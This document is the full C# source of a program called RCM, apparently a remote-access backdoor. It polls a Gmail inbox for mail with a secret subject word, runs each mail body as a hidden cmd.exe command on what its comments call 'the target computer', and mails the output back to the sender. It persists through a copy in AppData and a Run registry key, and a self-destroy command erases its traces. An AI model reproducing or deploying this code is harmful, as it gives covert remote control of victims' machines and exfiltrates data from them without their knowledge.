using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Mail;
using System.Reflection;
using System.Security;
using System.Security.Permissions;
using System.Text;
using System.Threading;
using Microsoft.Win32;
using OpenPop.Mime;
using OpenPop.Pop3;

namespace RCM
{
    class Program
    {
        static void Main(string[] args)
        {
            //Call function to make this program run automatic on start up
            bool autorun = false;

            //data of email, where app will be listening
            string username = "username@gmail.com";
            string password = "password";

            //data to receive mails
            string hostname = "pop.gmail.com";
            int port = 995;
            bool useSsl = true;

            //data to send mails
            string outHost = "smtp.gmail.com";
            int outPort = 587;
            bool outSsl = true;

            //secret word that must be in Subject to detect and execute the body command
            string secret = "zadeva";

            //delete mail after executing (not working on GMail, and it isn't required for GMail)
            bool deleteMessages = false;

            //check for new mails on interval (in millisecond)
            int interval = 60 * 1000;
            /*
             * REPLAY SETTINGS
			 * If you want that the app will send the terminal output back to the sender,
			 * you need to enter replay_word before the command in the body
             * 
             * Example: "ping 192.168.1.1"
             * It should look like "replay:ping 192.168.1.1"
             */
            string replay_word = "replay:";

            /*
             * SELF-DESTROY 
             * if you want to delete the app from the target computer
             * send the destroyMe word in the body
             */
            string destroyMe = "self-destroy";

            ///////////////////////////////////////////////////////////////////////////////////////////
            ///////////////////////////////////////////////////////////////////////////////////////////
            /*
             * Source... do not change!
             * 
             */

            if (autorun)
            {
                autoStart();
            }

            Console.Beep();
            Console.WriteLine("Start listening on " + username);
            Console.WriteLine("Secret passphrase in Subject is set to: " + secret);
            Console.WriteLine();
            Console.Beep();
            while (true)
            {
                List<Message> sporocila = FetchAllMessages(hostname, port, useSsl, username, password);

                for (int q = sporocila.Count - 1; q >= 0; q--)
                //foreach (Message s in sporocila)
                {
                    Message s = sporocila[q];
                    //get the Subject of the Message
                    string subject = s.Headers.Subject.ToString();

                    if (subject == secret) //if the mail has the secret word in the Subject
                    {
                        string mid = s.Headers.MessageId.ToString().Trim(); //Get ID of the message
                        
                        OpenPop.Mime.MessagePart plainText = s.FindFirstPlainTextVersion();
                        StringBuilder builder = new StringBuilder();
                        if(plainText != null)
                        {
                            // We found some plaintext!
                            builder.Append(plainText.GetBodyAsText());
                        }
                        string content = builder.ToString().Trim();
                        
                       // int len = s.MessagePart.MessageParts.Count;
                        //content += s.MessagePart.MessageParts[0].GetBodyAsText(); //Get the body of the message
                        if (!String.IsNullOrEmpty(content))
                        {
                            if (content == destroyMe) //if the destroy was required
                            {
                                DestroyMe();
                            }

                            //check if the output was required
                            bool replay = false;
                            int rep_len = replay_word.Length;
                            if (content.Substring(0, rep_len) == replay_word)
                            {
                                replay = true;
                                content = content.Substring(rep_len);
                            }

                            //Write the message data
                            Console.WriteLine("-----------------------------------------------------------------");
                            Console.WriteLine("Requested response: " + replay);
                            Console.WriteLine("Deleteing message: " + deleteMessages);
                            Console.WriteLine("Command to execute: " + content);
                            Console.WriteLine("Message id: " + mid);

                            if (replay)
                            {
                                //execute and save output, then send it back to sender
                                string sender = s.Headers.From.Address;
                                Console.WriteLine("Output sending to:" + sender);

                                string outBody = runCMD_Feedback(content);
                                Console.WriteLine();
                                Console.WriteLine("Output:" + outBody);
                                bool send_status = SendOutputBackToSender(username, password, sender, outHost, outPort, outBody, outSsl);
                                Console.WriteLine();
                                Console.WriteLine("Send status: " + send_status);
                            }
                            else
                            {
                                runCMD_NoFeedback(content); //run command with no output
                            }
                        }

                        //if the deleting was required
                        if (deleteMessages)
                        {
                            bool delete = DeleteMessageByMessageId(hostname, port, useSsl, username, password, mid);
                            Console.WriteLine("Delete status: " + delete);
                        }
                    }
                }

                //sleep for a while, then repeat the loop
                Thread.Sleep(interval);
            }
        }

        private static void autoStart()
        {
            /* Object: 
                -copy file and the OpenPop.dll to AppData\Local
                -add file to autorun registry
            */

            string exepath = Assembly.GetEntryAssembly().Location;
            string path = Path.GetDirectoryName(exepath); //folder we are into right now

            //C:\Users\User\AppData\Local
            string userPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string toRun = userPath + @"\RCM";

            //target path:
            string target = toRun + @"\" + System.Diagnostics.Process.GetCurrentProcess().ProcessName;

            if (path == toRun)
            {
                //the files are on the right place
                //C:\Users\User\AppData\Local\RCM
                if (checkWritableKey()) //add key again if writable
                {
                    RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    rk.SetValue(System.Diagnostics.Process.GetCurrentProcess().ProcessName, path + @"\" + System.Diagnostics.Process.GetCurrentProcess().ProcessName + ".exe");
                }
            }
            else
            {
                if (IsDirectoryWritable(userPath))
                {
                    //create RCM folder
                    if (!Directory.Exists(toRun))
                    {
                        Directory.CreateDirectory(toRun);
                    }
                    //copy OpenPop and myself to toRUn
                    try
                    {
                        //copy OpenPop
                        File.Copy(path + @"\OpenPop.dll", toRun + @"\OpenPop.dll");
                    }
                    catch { }

                    try
                    {
                        //copy application .exe
                        File.Copy(path + @"\" + System.Diagnostics.Process.GetCurrentProcess().ProcessName + ".exe", toRun + @"\" + System.Diagnostics.Process.GetCurrentProcess().ProcessName + ".exe");
                    }
                    catch { }

                    //write to regedit
                    if (checkWritableKey())
                    {
                        RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        rk.SetValue(System.Diagnostics.Process.GetCurrentProcess().ProcessName, toRun + @"\" + System.Diagnostics.Process.GetCurrentProcess().ProcessName + ".exe");
                    }
                    //start new one,
                    //kill my self
                    var info = new ProcessStartInfo("cmd.exe", "/C ping 1.1.1.1 -n 1 -w 3000 > Nul & start \"\" \"" + toRun + @"\" + System.Diagnostics.Process.GetCurrentProcess().ProcessName + ".exe\"");
                    info.WindowStyle = ProcessWindowStyle.Hidden;
                    Process.Start(info).Dispose();
                    Environment.Exit(0);
                }
            }

        }


        private static void DestroyMe()
        {
            //delete autorun keys
            try
            {
                string appName = System.Diagnostics.Process.GetCurrentProcess().ProcessName; //RCM by default

                RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                rk.DeleteValue(appName, false);
            }
            catch { }

            //delete RCM.exe
            //OpenPop.dll will not be deleted
            try
            {
                var exepath = Assembly.GetEntryAssembly().Location;
                var info = new ProcessStartInfo("cmd.exe", "/C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \"" + exepath + "\"");
                info.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(info).Dispose();
                Environment.Exit(0);
            }
            catch { }
        }

        private static bool IsDirectoryWritable(string dirPath) //check if we have access to the folder
        {
            try
            {
                using (FileStream fs = File.Create(
                    Path.Combine(
                        dirPath,
                        Path.GetRandomFileName()
                    ),
                    1,
                    FileOptions.DeleteOnClose)
                )
                { }
                return true;
            }
            catch
            {
                return false;
            }
        }

        private static bool checkWritableKey() //check if we have access to the startUp key
        {
            try
            {
                RegistryPermission r = new RegistryPermission(RegistryPermissionAccess.Write, @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
                r.Demand();
                return true;
            }
            catch (SecurityException)
            {
                return false;
            }
        }

        private static List<Message> FetchAllMessages(string hostname, int port, bool useSsl, string username, string password)
        {
            // The client disconnects from the server when being disposed
            using (Pop3Client client = new Pop3Client())
            {
                // Connect to the server
                client.Connect(hostname, port, useSsl);

                // Authenticate ourselves towards the server
                client.Authenticate(username, password);

                // Get the number of messages in the inbox
                int messageCount = client.GetMessageCount();

                // We want to download all messages
                List<Message> allMessages = new List<Message>(messageCount);

                // Messages are numbered in the interval: [1, messageCount]
                // Ergo: message numbers are 1-based.
                // Most servers give the latest message the highest number
                for (int i = messageCount; i > 0; i--)
                {
                    allMessages.Add(client.GetMessage(i));
                }

                // Now return the fetched messages
                return allMessages;
            }
        }

        private static bool DeleteMessageByMessageId(string hostname, int port, bool useSsl, string username, string password, string messageId)
        {
            using (Pop3Client client = new Pop3Client())
            {
                // Connect to the server
                client.Connect(hostname, port, useSsl);

                // Authenticate ourselves towards the server
                client.Authenticate(username, password);


                // Get the number of messages on the POP3 server
                int messageCount = client.GetMessageCount();

                // Run trough each of these messages and download the headers
                for (int messageItem = messageCount; messageItem > 0; messageItem--)
                {
                    // If the Message ID of the current message is the same as the parameter given, delete that message
                    if (client.GetMessageHeaders(messageItem).MessageId == messageId)
                    {
                        // Delete
                        client.DeleteMessage(messageItem);
                        return true;
                    }
                }
                // We did not find any message with the given messageId, report this back
                return false;
            }
        }

        private static bool SendOutputBackToSender(string username, string password, string sender, string outHost, int outPort, string outBody, bool enableOutSsl)
        {
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient(outHost);

                mail.From = new MailAddress(username);
                mail.To.Add(sender);
                mail.Subject = "AutoResponseRCM";
                mail.Body = outBody;

                SmtpServer.Port = 587;
                SmtpServer.Credentials = new System.Net.NetworkCredential(username, password);
                SmtpServer.EnableSsl = enableOutSsl;

                SmtpServer.Send(mail);
                return true;
            }
            catch //(Exception ex)
            {
                //Console.WriteLine(ex.ToString());
                return false;
            }
        }

        private static string runCMD_Feedback(string command)
        {
            string output = "";

            ProcessStartInfo startInfo = new ProcessStartInfo("cmd", "/c " + command)
            {
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                CreateNoWindow = true
            };

            Process process = Process.Start(startInfo);
            //process.OutputDataReceived += (sender, e) => Console.WriteLine(e.Data);
            process.OutputDataReceived += (sender, e) => output += e.Data;

            process.BeginOutputReadLine();
            process.Start();
            process.WaitForExit();

            return output;
        }

        private static void runCMD_NoFeedback(string command)
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C " + command;
            process.StartInfo = startInfo;
            process.Start();
        }
    }
}
